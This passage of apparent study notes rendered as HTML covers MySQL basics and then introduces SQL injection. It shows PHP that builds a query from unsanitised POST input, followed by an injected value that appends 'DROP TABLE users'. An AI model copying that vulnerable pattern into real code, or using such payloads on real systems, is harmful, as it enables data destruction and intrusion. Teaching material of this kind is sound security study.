+</section>
+<section id="databases">
+<h2>DATABASES<a class="headerlink" href="#databases" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">SHOW</span> <span class="n">GRANTS</span><span class="p">;</span>            <span class="c1"># show current user&#39;s privileges</span>
+<span class="n">CREATE</span> <span class="n">DATABASE</span> <span class="n">users</span><span class="p">;</span>  <span class="c1"># create db &quot;users&quot;</span>
+<span class="n">SHOW</span> <span class="n">DATABASES</span><span class="p">;</span>         <span class="c1"># show all databases</span>
+<span class="n">USE</span> <span class="n">users</span><span class="p">;</span>              <span class="c1"># interact with database &quot;users&quot;</span>
+</pre></div>
+</div>
+</section>
+<section id="tables">
+<h2>Tables<a class="headerlink" href="#tables" title="Permalink to this heading">#</a></h2>
+<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">logins</span><span class="w"> </span><span class="p">(...);</span><span class="w">  </span><span class="o">#</span><span class="w"> </span><span class="n">see</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">MySQL</span><span class="w"> </span><span class="n">datatypes</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">documentation</span>
+<span class="k">SHOW</span><span class="w"> </span><span class="n">TABLES</span><span class="p">;</span><span class="w">                </span><span class="o">#</span><span class="w"> </span><span class="k">get</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">list</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">tables</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="k">current</span><span class="w"> </span><span class="k">database</span>
+<span class="k">DESCRIBE</span><span class="w"> </span><span class="n">logins</span><span class="p">:</span><span class="w">            </span><span class="o">#</span><span class="w"> </span><span class="k">get</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">description</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="ss">&quot;logins&quot;</span><span class="w"> </span><span class="n">ei</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">columns</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">their</span><span class="w"> </span><span class="k">data</span><span class="w"> </span><span class="n">types</span>
+</pre></div>
+</div>
+<p>basic create table</p>
+<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">logins</span><span class="w"> </span><span class="p">(</span>
+<span class="n">id</span><span class="w"> </span><span class="nb">INT</span><span class="p">,</span>
+<span class="n">username</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">100</span><span class="p">),</span>
+<span class="n">password</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">100</span><span class="p">),</span>
+<span class="n">date_of_joining</span><span class="w"> </span><span class="n">DATETIME</span><span class="p">,</span>
+<span class="p">);</span>
+</pre></div>
+</div>
+<p>create table example with slightly more addvanced properties</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">CREATE</span> <span class="n">TABLE</span> <span class="n">logins</span> <span class="p">(</span>
+<span class="nb">id</span> <span class="n">INT</span> <span class="n">NOT</span> <span class="n">NULL</span> <span class="n">AUTO_INCREMENT</span><span class="p">,</span>            <span class="c1"># set id value to increment automatically at each entry</span>
+<span class="n">username</span> <span class="n">VARCHAR</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span> <span class="n">UNIQUE</span> <span class="n">NOT</span> <span class="n">NULL</span><span class="p">,</span>     <span class="c1"># ensure that the username is never left empty and is unique</span>
+<span class="n">password</span> <span class="n">VARCHAR</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span> <span class="n">NOT</span> <span class="n">NULL</span><span class="p">,</span>            <span class="c1"># password doesn&#39;t have to be unique but cannot be empty</span>
+<span class="n">date_of_joining</span> <span class="n">DATETIME</span> <span class="n">DEFAULT</span> <span class="n">NOW</span><span class="p">(),</span>    <span class="c1"># set date_of_joining value to current date and time</span>
+<span class="n">PRIMARY</span> <span class="n">KEY</span> <span class="p">(</span><span class="nb">id</span><span class="p">)</span>                           <span class="c1"># make id the primary key</span>
+<span class="p">);</span>
+</pre></div>
+</div>
+</section>
+<section id="properties-keywords">
+<h2>Properties keywords<a class="headerlink" href="#properties-keywords" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">DATETIME</span>   <span class="o">-</span> <span class="n">datatype</span> <span class="o">-</span> <span class="n">date</span> <span class="o">/</span> <span class="n">time</span>
+<span class="n">INT</span>        <span class="o">-</span> <span class="n">datatype</span> <span class="o">-</span> <span class="n">integer</span>
+<span class="n">VARCHAR</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">-</span> <span class="n">datatype</span> <span class="o">-</span> <span class="n">variable</span> <span class="n">of</span> <span class="nb">max</span> <span class="n">i</span> <span class="n">char</span>
+
+<span class="n">NOT</span> <span class="n">NULL</span>   <span class="o">-</span> <span class="n">constraint</span> <span class="o">-</span> <span class="n">column</span> <span class="ow">is</span> <span class="n">never</span> <span class="n">left</span> <span class="n">empty</span>
+<span class="n">UNIQUE</span>     <span class="o">-</span> <span class="n">constraint</span> <span class="o">-</span> <span class="n">inserted</span> <span class="n">item</span> <span class="ow">is</span> <span class="n">unique</span>
+
+<span class="n">DEFAULT</span>        <span class="o">-</span> <span class="n">sets</span> <span class="n">a</span> <span class="n">default</span> <span class="n">value</span> <span class="n">to</span> <span class="n">an</span> <span class="n">item</span>
+<span class="n">AUTO_INCREMENT</span> <span class="o">-</span> <span class="n">auto</span> <span class="n">increment</span> <span class="n">item</span>
+<span class="n">NOW</span><span class="p">()</span>          <span class="o">-</span> <span class="n">returns</span> <span class="n">current</span> <span class="n">date</span> <span class="ow">and</span> <span class="n">time</span> <span class="ow">in</span> <span class="n">MySQL</span>
+</pre></div>
+</div>
+</section>
+<section id="insert-statement">
+<h2>Insert statement<a class="headerlink" href="#insert-statement" title="Permalink to this heading">#</a></h2>
+<p>add new records by filling the values for all the columns present in the table</p>
+<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="n">column1_value</span><span class="p">,</span><span class="w"> </span><span class="n">column2_value</span><span class="p">,</span><span class="w"> </span><span class="n">column3_value</span><span class="p">,</span><span class="w"> </span><span class="p">...);</span>
+<span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">logins</span><span class="w"> </span><span class="k">VALUES</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;admin&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;p@ssw0rd&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;2020-07-02&#39;</span><span class="p">);</span>
+</pre></div>
+</div>
+<p>skip the columns with a set default value or Null allowed by specifying the column names to insert data into</p>
+<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="k">table_name</span><span class="p">(</span><span class="n">column2</span><span class="p">,</span><span class="w"> </span><span class="n">column3</span><span class="p">,</span><span class="w"> </span><span class="p">...)</span><span class="w"> </span><span class="k">VALUES</span><span class="p">(</span><span class="n">column2_value</span><span class="p">,</span><span class="w"> </span><span class="n">column3_value</span><span class="p">,</span><span class="w"> </span><span class="p">...);</span>
+<span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">logins</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="p">(</span><span class="s1">&#39;administrator&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;adm1n_p@ss&#39;</span><span class="p">);</span>
+</pre></div>
+</div>
+</section>
+<section id="select-statement">
+<h2>Select statement<a class="headerlink" href="#select-statement" title="Permalink to this heading">#</a></h2>
+<p>show all or some columns for a given table</p>
+<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">table_name</span><span class="p">;</span>
+<span class="k">SELECT</span><span class="w"> </span><span class="n">column1</span><span class="p">,</span><span class="w"> </span><span class="n">column2</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">table_name</span><span class="p">;</span>
+</pre></div>
+</div>
+</section>
+<section id="drop-statement">
+<h2>Drop statement<a class="headerlink" href="#drop-statement" title="Permalink to this heading">#</a></h2>
+<p>use drop to remove tables and databases from the server</p>
+<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="k">DROP</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">logins</span><span class="p">;</span>
+</pre></div>
+</div>
+</section>
+<section id="alter-statement">
+<h2>Alter statement<a class="headerlink" href="#alter-statement" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ALTER</span> <span class="n">TABLE</span> <span class="n">logins</span> <span class="n">ADD</span> <span class="n">newColumn</span> <span class="n">INT</span><span class="p">;</span>                     <span class="c1"># add new column</span>
+<span class="n">ALTER</span> <span class="n">TABLE</span> <span class="n">logins</span> <span class="n">RENAME</span> <span class="n">COLUMN</span> <span class="n">newColumn</span> <span class="n">TO</span> <span class="n">oldColumn</span><span class="p">;</span>  <span class="c1"># rename column</span>
+<span class="n">ALTER</span> <span class="n">TABLE</span> <span class="n">logins</span> <span class="n">MODIFY</span> <span class="n">oldColumn</span> <span class="n">DATE</span><span class="p">;</span>                 <span class="c1"># change a column&#39;s datatype</span>
+<span class="n">ALTER</span> <span class="n">TABLE</span> <span class="n">logins</span> <span class="n">DROP</span> <span class="n">oldColumn</span><span class="p">;</span>                        <span class="c1"># remove a column</span>
+</pre></div>
+</div>
+</section>
+<section id="update-statement">
+<h2>Update statement<a class="headerlink" href="#update-statement" title="Permalink to this heading">#</a></h2>
+<p>update values for given columns where condition is met</p>
+<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="k">UPDATE</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">SET</span><span class="w"> </span><span class="n">column1</span><span class="o">=</span><span class="n">newvalue1</span><span class="p">,</span><span class="w"> </span><span class="n">column2</span><span class="o">=</span><span class="n">newvalue2</span><span class="p">,</span><span class="w"> </span><span class="p">...</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="o">&lt;</span><span class="n">condition</span><span class="o">&gt;</span><span class="p">;</span>
+</pre></div>
+</div>
+<p>update the password for everybody but uid 1</p>
+<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="k">UPDATE</span><span class="w"> </span><span class="n">logins</span><span class="w"> </span><span class="k">SET</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;change_password&#39;</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+</pre></div>
+</div>
+</section>
+<section id="order-by">
+<h2>Order by<a class="headerlink" href="#order-by" title="Permalink to this heading">#</a></h2>
+<p>show the content of hte logins table and order alphabetically by the password field</p>
+<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">logins</span><span class="w"> </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">password</span><span class="p">;</span>
+</pre></div>
+</div>
+<p>descending</p>
+<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">logins</span><span class="w"> </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">DESC</span><span class="p">;</span>
+</pre></div>
+</div>
+<p>ascending</p>
+<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">logins</span><span class="w"> </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">ASC</span><span class="p">;</span>
+</pre></div>
+</div>
+<p>sort by multiple columns, to have a secondary sort for duplicate values in one column:</p>
+<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">logins</span><span class="w"> </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">DESC</span><span class="p">,</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="k">ASC</span><span class="p">;</span>
+</pre></div>
+</div>
+</section>
+<section id="limit">
+<h2>Limit<a class="headerlink" href="#limit" title="Permalink to this heading">#</a></h2>
+<p>only the first 2 results from the table</p>
+<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">logins</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span>
+</pre></div>
+</div>
+<p>show only 2 results from the table starting at an obset of 1</p>
+<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">logins</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span>
+</pre></div>
+</div>
+</section>
+<section id="where-clause">
+<h2>Where clause<a class="headerlink" href="#where-clause" title="Permalink to this heading">#</a></h2>
+<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="o">&lt;</span><span class="n">condition</span><span class="o">&gt;</span><span class="p">;</span>
+<span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">logins</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">1</span>
+<span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">logins</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;admin&#39;</span><span class="p">;</span>
+</pre></div>
+</div>
+</section>
+<section id="like-clause">
+<h2>Like clause<a class="headerlink" href="#like-clause" title="Permalink to this heading">#</a></h2>
+<p>The % symbol acts as a wildcard and matches all characters after admin</p>
+<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">logins</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;admin%&#39;</span><span class="p">;</span>
+</pre></div>
+</div>
+<p>The _ symbol is used to match exactly one character</p>
+<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">logins</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;___&#39;</span><span class="p">;</span>
+</pre></div>
+</div>
+</section>
+<section id="and-operator">
+<h2>AND operator (&amp;&amp;)<a class="headerlink" href="#and-operator" title="Permalink to this heading">#</a></h2>
+<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="s1">&#39;test&#39;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;test&#39;</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">---------------------------+</span>
+<span class="o">|</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="s1">&#39;test&#39;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;test&#39;</span><span class="w"> </span><span class="o">|</span>
+<span class="o">+</span><span class="c1">---------------------------+</span>
+<span class="o">|</span><span class="w">    </span><span class="mi">1</span><span class="w">                      </span><span class="o">|</span>
+<span class="o">+</span><span class="c1">---------------------------+</span>
+
+<span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="s1">&#39;test&#39;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;abc&#39;</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">--------------------------+</span>
+<span class="o">|</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="s1">&#39;test&#39;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;abc&#39;</span><span class="w"> </span><span class="o">|</span>
+<span class="o">+</span><span class="c1">--------------------------+</span>
+<span class="o">|</span><span class="w">   </span><span class="mi">0</span><span class="w">                      </span><span class="o">|</span>
+<span class="o">+</span><span class="c1">--------------------------+</span>
+</pre></div>
+</div>
+</section>
+<section id="or-operator">
+<h2>OR operator (||)<a class="headerlink" href="#or-operator" title="Permalink to this heading">#</a></h2>
+<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="s1">&#39;test&#39;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;abc&#39;</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">-------------------------+</span>
+<span class="o">|</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="s1">&#39;test&#39;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;abc&#39;</span><span class="w"> </span><span class="o">|</span>
+<span class="o">+</span><span class="c1">-------------------------+</span>
+<span class="o">|</span><span class="w">  </span><span class="mi">1</span><span class="w">                      </span><span class="o">|</span>
+<span class="o">+</span><span class="c1">-------------------------+</span>
+
+<span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="s1">&#39;test&#39;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;abc&#39;</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">-------------------------+</span>
+<span class="o">|</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="s1">&#39;test&#39;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;abc&#39;</span><span class="w"> </span><span class="o">|</span>
+<span class="o">+</span><span class="c1">-------------------------+</span>
+<span class="o">|</span><span class="w">  </span><span class="mi">0</span><span class="w">                      </span><span class="o">|</span>
+<span class="o">+</span><span class="c1">-------------------------+</span>
+</pre></div>
+</div>
+</section>
+<section id="not-operator">
+<h2>NOT operator (!=)<a class="headerlink" href="#not-operator" title="Permalink to this heading">#</a></h2>
+<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="k">SELECT</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">-----------+</span>
+<span class="o">|</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">|</span>
+<span class="o">+</span><span class="c1">-----------+</span>
+<span class="o">|</span><span class="w">  </span><span class="mi">0</span><span class="w">        </span><span class="o">|</span>
+<span class="o">+</span><span class="c1">-----------+</span>
+
+<span class="k">SELECT</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">-----------+</span>
+<span class="o">|</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="o">|</span>
+<span class="o">+</span><span class="c1">-----------+</span>
+<span class="o">|</span><span class="w">  </span><span class="mi">1</span><span class="w">        </span><span class="o">|</span>
+<span class="o">+</span><span class="c1">-----------+</span>
+</pre></div>
+</div>
+</section>
+<section id="operator-precedence">
+<h2>Operator precedence<a class="headerlink" href="#operator-precedence" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Division (/), Multiplication (*), and Modulus (%)
+Addition (+) and Subtraction (-)
+Comparison (=, &gt;, &lt;, &lt;=, &gt;=, !=, LIKE)
+NOT (!)
+AND (&amp;&amp;)
+OR (||)
+</pre></div>
+</div>
+</section>
+<section id="operator-examples">
+<h2>Operator examples<a class="headerlink" href="#operator-examples" title="Permalink to this heading">#</a></h2>
+<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">logins</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="s1">&#39;john&#39;</span><span class="p">;</span>
+<span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">logins</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="s1">&#39;john&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+<span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">logins</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="s1">&#39;tom&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span>
+<span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">logins</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="s1">&#39;tom&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">1</span>
+<span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">titles</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">emp_no</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">200000</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="n">title</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%engineer&#39;</span><span class="p">;</span>
+</pre></div>
+</div>
+</section>
+<section id="php">
+<h2>PHP<a class="headerlink" href="#php" title="Permalink to this heading">#</a></h2>
+<p>example of php code reading and printing the whole logins table</p>
+<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="c1">//connect to the db and get all logins table items in $result variable</span>
+<span class="nv">$conn</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">mysqli</span><span class="p">(</span><span class="s2">&quot;localhost&quot;</span><span class="p">,</span> <span class="s2">&quot;root&quot;</span><span class="p">,</span> <span class="s2">&quot;password&quot;</span><span class="p">,</span> <span class="s2">&quot;users&quot;</span><span class="p">);</span>
+<span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;select * from logins&quot;</span><span class="p">;</span>
+<span class="nv">$result</span> <span class="o">=</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span>
+
+<span class="c1">//print every line from the result with a carriage return</span>
+<span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="na">fetch_assoc</span><span class="p">()</span> <span class="p">){</span>
+    <span class="k">echo</span> <span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;br&gt;&quot;</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</pre></div>
+</div>
+<p>example of php code printing the searchInput item requested by user from the logins database</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&lt;?php
+//connect to the db and get user searchInput from the logins table
+$conn = new mysqli(&quot;localhost&quot;, &quot;root&quot;, &quot;password&quot;, &quot;users&quot;);
+$searchInput =  $_POST[&#39;findUser&#39;];
+$query = &quot;select * from logins where username like &#39;%$searchInput&#39;&quot;;
+$result = $conn-&gt;query($query);
+
+//print every line from the result with a carriage return
+while($row = $result-&gt;fetch_assoc() ){
+    echo $row[&quot;name&quot;].&quot;&lt;br&gt;&quot;;
+}
+?&gt;
+</pre></div>
+</div>
+<p>if $searchInput=”admin” then the above query gets executed</p>
+<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">logins</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%admin&#39;</span>
+</pre></div>
+</div>
+<p>if $searchInput=”admin’; DROP TABLE users;” then normal query for admin in logins table gets executed<br />
+but a second query to drop the table users also gets executed<br />
+adding 2 queries in 1 lines is possible in MSSQL and PostgreSQL but not MySQL</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">SELECT</span> <span class="o">*</span> <span class="n">FROM</span> <span class="n">logins</span> <span class="n">WHERE</span> <span class="n">username</span> <span class="n">LIKE</span> <span class="s1">&#39;</span><span class="si">%a</span><span class="s1">dmin&#39;</span><span class="p">;</span> <span class="n">DROP</span> <span class="n">TABLE</span> <span class="n">users</span><span class="p">;</span><span class="s1">&#39;</span>
+</pre></div>
+</div>
+</section>
+<section id="id1">
+<h2>Injection types<a class="headerlink" href="#id1" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>                                        ╔═════════╗
+                                        ║  SQLi   ║
+                                        ╚═════════╝
+                                             |
+                 |&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;|&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;|
+            ╔═════════╗                 ╔═════════╗                ╔═════════╗
+            ║   IB    ║                 ║  BLIND  ║                ║   OOB   ║  
+            ╚═════════╝                 ╚═════════╝                ╚═════════╝
+                 |                           |
+          |&#39;&#39;&#39;&#39;&#39;&#39; &#39;&#39;&#39;&#39;&#39;&#39;|             |&#39;&#39;&#39;&#39;&#39;&#39; &#39;&#39;&#39;&#39;&#39;&#39;|
